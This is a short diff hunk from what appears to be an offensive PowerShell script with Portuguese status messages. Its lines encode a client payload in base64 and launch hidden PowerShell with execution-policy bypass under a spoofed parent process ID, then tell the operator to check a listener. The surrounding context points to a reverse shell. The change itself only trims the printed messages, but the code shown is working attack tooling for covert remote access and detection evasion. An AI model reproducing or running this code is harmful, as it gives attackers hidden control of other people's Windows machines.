@@ -176,6 +176,6 @@ while((`$i = `$s.Read(`$b, 0, `$b.Length)) -ne 0){
 
 $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($client_payload))
 
-Write-Host "[+] Tentando spoofing do PID $ppid..." -ForegroundColor Cyan
+Write-Host "[+] Tentando spoofing do PID..." -ForegroundColor Cyan
 ImpersonateFromParentPid -ppid $ppid -command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -cmdargs "-ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
-Write-Host "[+] Processo disparado. Verifique seu listener em $lhost:$lport" -ForegroundColor Green
+Write-Host "[+] Processo disparado. Verifique seu listener..." -ForegroundColor Green
